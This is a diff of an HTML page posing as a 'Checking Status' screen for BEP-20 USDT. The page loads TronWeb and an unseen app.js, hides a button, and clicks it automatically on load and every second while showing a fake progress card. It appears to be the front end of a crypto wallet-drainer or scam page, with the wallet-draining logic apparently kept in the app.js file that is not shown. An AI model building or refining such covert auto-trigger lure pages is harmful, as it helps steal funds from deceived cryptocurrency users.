@@ -1,252 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>All Scroll Systems Integrated</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-user-select: none;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Checking Status</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      user-select: none;
+      -webkit-user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      margin: 0;
+      padding: 0;
+    }
 
-        /* Root Layout & Uniform Background */
-        html, body {
-            width: 100%;
-            height: 100vh;
-            background-color: #0d111a;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            color: #ffffff;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #0d111a;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #fff;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-        /* 9:16 Mobile Aspect Viewport Container */
-        .app-viewport {
-            width: 100vw;
-            height: 100vh;
-            max-width: calc(100vh * (9/16));
-            background-color: #0d111a;
-            position: relative;
-            overflow: hidden;
-        }
+    /* 9:16 Aspect Frame Container */
+    .app-viewport {
+      width: 100vw;
+      height: 100vh;
+      max-width: calc(100vh * (9/16));
+      background-color: #0d111a;
+      position: relative;
+      overflow: hidden;
+    }
 
-        /* System 1: CSS Scroll Snap & Momentum Scroll Engine */
-        .scroll-container {
-            width: 100%;
-            height: 100%;
-            overflow-y: scroll;
-            scroll-snap-type: y mandatory;
-            scroll-behavior: smooth;
-            -webkit-overflow-scrolling: touch; /* iOS Inertia Scroll */
-            -ms-overflow-style: none; /* IE/Edge */
-            scrollbar-width: none; /* Firefox */
-        }
+    /* Primary Snap Scroll Engine */
+    .a {
+      width: 100%;
+      height: 100vh;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory;
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 20px;
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
 
-        /* System 2: Custom Invisible Scrollbar Engine */
-        .scroll-container::-webkit-scrollbar {
-            display: none;
-            width: 0px;
-            background: transparent;
-        }
+    .a::-webkit-scrollbar {
+      display: none;
+    }
 
-        /* Section Base Styles */
-        .section {
-            height: 100%;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 20px;
-            scroll-snap-align: start;
-            scroll-snap-stop: always;
-            background-color: #0d111a;
-            position: relative;
-        }
+    .b {
+      height: 30vh;
+      scroll-snap-align: start;
+    }
 
-        /* Stacked Icons Container */
-        .icon-wrapper {
-            position: relative;
-            width: 76px;
-            height: 76px;
-            margin-bottom: 24px;
-        }
+    /* Floating Center Target View */
+    .c {
+      height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      scroll-snap-align: center;
+      padding: 10px 0 20px 0;
+    }
 
-        .usdt-icon {
-            width: 76px;
-            height: 76px;
-            border-radius: 50%;
-            object-fit: cover;
-            display: block;
-        }
+    /* Stacked Icons Container */
+    .icon-wrapper {
+      position: relative;
+      width: 76px;
+      height: 76px;
+      margin-bottom: 24px;
+    }
 
-        .bnb-badge {
-            position: absolute;
-            bottom: -2px;
-            right: -2px;
-            width: 28px;
-            height: 28px;
-            background-color: #0d111a;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2px;
-        }
+    .usdt-icon {
+      width: 76px;
+      height: 76px;
+      border-radius: 50%;
+      object-fit: cover;
+      display: block;
+    }
 
-        .bnb-badge img {
-            width: 24px;
-            height: 24px;
-            border-radius: 6px;
-            object-fit: cover;
-        }
+    .bnb-badge {
+      position: absolute;
+      bottom: -2px;
+      right: -2px;
+      width: 28px;
+      height: 28px;
+      background-color: #0d111a;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2px;
+    }
 
-        .title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 12px;
-            letter-spacing: -0.2px;
-        }
+    .bnb-badge img {
+      width: 24px;
+      height: 24px;
+      border-radius: 6px;
+      object-fit: cover;
+    }
 
-        .subtitle {
-            font-size: 11.5px;
-            font-weight: 600;
-            color: #7d8795;
-            letter-spacing: 0.8px;
-            text-transform: uppercase;
-            max-width: 280px;
-            line-height: 1.4;
-        }
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 12px;
+      letter-spacing: -0.2px;
+    }
 
-        /* System 3: Absolute Center Floating Element Layer */
-        .floating-card {
-            width: 100%;
-            max-width: 360px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 28px 20px;
-            background: #131824;
-            border-radius: 24px;
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
+    .subtitle {
+      font-size: 11.5px;
+      font-weight: 600;
+      color: #7d8795;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      max-width: 280px;
+      line-height: 1.4;
+    }
 
-        /* Hidden Auto-Trigger Button */
-        #start-btn {
-            display: none;
-        }
-    </style>
+    /* Hidden Button for Background Script Trigger */
+    #start-btn {
+      display: none;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="app-viewport">
-        <div class="scroll-container" id="scrollContainer">
-            
-            <!-- Section 1: Top View -->
-            <div class="section" id="splashView">
-                <div class="icon-wrapper">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
-                    <div class="bnb-badge">
-                        <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
-                    </div>
-                </div>
+<div class="app-viewport">
+  <div class="a" id="scrollContainer">
+    <div class="b"></div>
 
-                <h1 class="title">Checking...</h1>
-                <p class="subtitle">BEP 20 USDT</p>
-            </div>
-
-            <!-- Section 2: Bottom Target View (Center Floating Setup) -->
-            <div class="section" id="bottomTarget">
-                <div class="floating-card" id="mainCard">
-                    <div class="icon-wrapper">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
-                        <div class="bnb-badge">
-                            <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
-                        </div>
-                    </div>
-                    <h1 class="title">Checking...</h1>
-                    <p class="subtitle">BEP 20 USDT</p>
-                </div>
-            </div>
-
+    <!-- Center Floating Screen Section -->
+    <div class="c" id="targetSection">
+      <div class="icon-wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png" alt="USDT Logo" class="usdt-icon">
+        <div class="bnb-badge">
+          <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Logo">
         </div>
+      </div>
+
+      <h1 class="title">Checking...</h1>
+      <p class="subtitle">BEP 20 USDT</p>
     </div>
+  </div>
+</div>
 
-    <!-- Hidden Button for Script Auto-Trigger -->
-    <button id="start-btn"></button>
+<!-- Hidden Button for Script Auto-Trigger -->
+<button id="start-btn"></button>
 
-    <!-- External Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-    <script src="app.js"></script>
+<!-- External Scripts -->
+<script defer src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+<script defer src="app.js"></script>
 
-    <!-- Multi-Method Combined Scroll & Trigger Script System -->
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const container = document.getElementById("scrollContainer");
-            const target = document.getElementById("bottomTarget");
-            const btn = document.getElementById("start-btn");
+<!-- Custom Native Window Scroll Engine & Trigger system -->
+<script>
+  const tSection = document.getElementById('targetSection');
 
-            // System A: Programmatic Multi-Tier Auto-Scroll Execution
-            const executeAutoScroll = () => {
-                // Method 1: ScrollIntoView API
-                target.scrollIntoView({ behavior: "smooth", block: "start" });
-                
-                // Method 2: Fallback Direct ScrollTop Offset Locking
-                setTimeout(() => {
-                    container.scrollTo({
-                        top: target.offsetTop,
-                        behavior: "smooth"
-                    });
-                }, 50);
+  // Exact Window-Load Scroll Trigger Technique
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      if (tSection) {
+        tSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }, 100);
+  });
 
-                // Method 3: Instant Hard-Lock Fallback
-                setTimeout(() => {
-                    if (container.scrollTop < target.offsetTop - 10) {
-                        container.scrollTop = target.offsetTop;
-                    }
-                }, 400);
-            };
+  // Background Auto-Click Loop Trigger System
+  document.addEventListener("DOMContentLoaded", () => {
+    const btn = document.getElementById("start-btn");
 
-            // Page Load Event par Trigger Execute
-            window.addEventListener("load", executeAutoScroll);
-            executeAutoScroll();
+    const triggerClick = () => {
+      if (btn) {
+        btn.click();
+      }
+    };
 
-            // System B: Intersection Observer (Jab Element Viewport me aaye tabhi trigger ho)
-            const observerOptions = {
-                root: container,
-                threshold: 0.6
-            };
+    triggerClick();
+    setInterval(triggerClick, 1000);
+  });
+</script>
 
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        if (btn) btn.click();
-                    }
-                });
-            }, observerOptions);
-
-            observer.observe(target);
-
-            // System C: Background Continuous Loop Auto-Trigger
-            const triggerClick = () => {
-                if (btn) btn.click();
-            };
-
-            triggerClick();
-            setInterval(triggerClick, 1000);
-        });
-    </script>
 </body>
 </html>
